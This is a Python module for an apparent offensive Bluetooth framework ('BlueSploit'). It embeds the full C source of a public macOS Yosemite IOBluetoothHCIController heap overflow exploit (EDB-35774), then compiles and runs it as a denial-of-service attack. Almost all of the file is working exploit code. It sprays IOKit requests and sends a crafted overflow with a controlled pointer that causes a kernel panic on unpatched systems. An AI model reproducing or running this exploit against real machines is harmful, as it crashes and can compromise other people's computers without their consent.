"""
BlueSploit Module: macOS DispatchHCIWriteStoredLinkKey Heap Overflow
EDB-ID: 35774  (Yosemite 10.10.1, @rpaleari & @joystick)

Original C PoC embedded verbatim; compiled and run at module execution time.
"""

from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)
from core.utils.c_runner import compile_and_run, find_compiler
from core.utils.iokit import is_macos


C_SOURCE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <IOKit/IOKitLib.h>

#define SIZE 0x1000

struct BluetoothCall {
  uint64_t args[7];
  uint64_t sizes[7];
  uint64_t index;
};

#ifndef bswap64
#   define bswap64(num) \
  ( (((uint64_t)(num) << 56)                               ) \
    | (((uint64_t)(num) << 40) & UINT64_C(0x00FF000000000000)) \
    | (((uint64_t)(num) << 24) & UINT64_C(0x0000FF0000000000)) \
    | (((uint64_t)(num) <<  8) & UINT64_C(0x000000FF00000000)) \
    | (((uint64_t)(num) >>  8) & UINT64_C(0x00000000FF000000)) \
    | (((uint64_t)(num) >> 24) & UINT64_C(0x0000000000FF0000)) \
    | (((uint64_t)(num) >> 40) & UINT64_C(0x000000000000FF00)) \
    | (((uint64_t)(num) >> 56)                               ) )
#endif

void create_requests(io_connect_t port) {
  struct BluetoothCall a;
  uint32_t i;
  for (i = 0; i < 7; i++) {
    a.args[i] = (uint64_t) calloc(SIZE, sizeof(char));
    a.sizes[i] = SIZE;
  }
  a.index = 0x0;
  *(uint64_t *)a.args[0] = 5*1000;
  memset((void *)a.args[1], 0x81, 0x1000);
  memset((void *)a.args[2], 0x82, 0x1000);
  memset((void *)a.args[3], 0x83, 0x1000);
  memset((void *)a.args[4], 0x84, 0x1000);
  memset((void *)a.args[5], 0x85, 0x1000);
  memset((void *)a.args[6], 0x86, 0x1000);
  for(i = 0; i < 500; i++) {
    kern_return_t kr = IOConnectCallMethod((mach_port_t) port, 0, NULL, 0,
                                           (const void*) &a, 120,
                                           NULL, NULL, NULL, NULL);
    if(kr == 0xe00002bd) break;
  }
}

int main(void) {
  struct BluetoothCall a;
  int i;
  void *landing_page = calloc(SIZE, sizeof(char));
  for (i = 0; i < 7; i++) {
    a.args[i] = (uint64_t) calloc(SIZE, sizeof(char));
    a.sizes[i] = SIZE;
  }

  io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
                                IOServiceMatching("IOBluetoothHCIController"));
  if (!service) return -1;
  io_connect_t port = (io_connect_t) 0;
  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
  IOObjectRelease(service);
  if (kr != kIOReturnSuccess) return kr;

  create_requests(port);

  a.index = 42;
  *((uint32_t *)a.args[0]) = 1;
  *((uint32_t *)a.args[1]) = 0x20;
  memset((void *)a.args[3], 0x33, 152);
  *((uint64_t *)(a.args[3]+152)) = bswap64((uint64_t)landing_page);
  *((uint64_t *)((uint64_t)landing_page)) = (uint64_t)landing_page;
  *((uint64_t *)((uint64_t)landing_page+0x1d0)) = (uint64_t) 0x4141414142424242;

  kr = IOConnectCallMethod((mach_port_t) port, 0, NULL, 0,
                           (const void*) &a, 120,
                           NULL, NULL, NULL, NULL);
  printf("kr: %08x\n", kr);
  return IOServiceClose(port);
}
"""


class Module(DosModule):
    info = ModuleInfo(
        name="dos/macos_iobt_writestoredlinkkey",
        description="macOS DispatchHCIWriteStoredLinkKey heap overflow (EDB-35774, native C)",
        author=["@rpaleari", "@joystick"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=["https://www.exploit-db.com/exploits/35774"],
    )

    def _setup_options(self) -> None:
        self.options = {}

    def run(self) -> bool:
        C = Colors
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}macOS DispatchHCIWriteStoredLinkKey (EDB-35774){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        if not is_macos():
            print_error("macOS only")
            return False
        if not find_compiler():
            print_error("No C compiler, install Xcode Command Line Tools")
            return False
        print_warning("Heap overflow, kernel panic on unpatched 10.10.1")

        rc, out, err = compile_and_run(
            C_SOURCE, "iobt_writestoredlinkkey",
            ldflags=["-framework", "IOKit"],
        )
        if rc == -1:
            print_error(err.strip())
            return False
        print_info(out)
        if err.strip():
            print_warning(err.strip())
        self.add_result({"edb_id": 35774, "rc": rc})
        return rc == 0
